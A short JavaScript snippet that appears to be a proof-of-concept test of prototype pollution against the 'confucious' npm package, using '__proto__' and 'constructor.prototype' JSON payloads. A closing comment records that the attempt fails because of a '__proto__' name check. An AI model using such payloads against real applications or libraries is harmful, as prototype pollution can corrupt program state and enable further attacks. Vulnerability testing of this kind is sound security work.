const confucious = require("confucious");
//const payload = JSON.parse('{ "constructor": {"prototype": { "polluted": "yes"}}}');
const payload = JSON.parse('{ "__proto__": { "polluted": "yes"}}');
confucious.set("a", payload);

// it doesn't work due to name === '__proto__' test in getProperty()
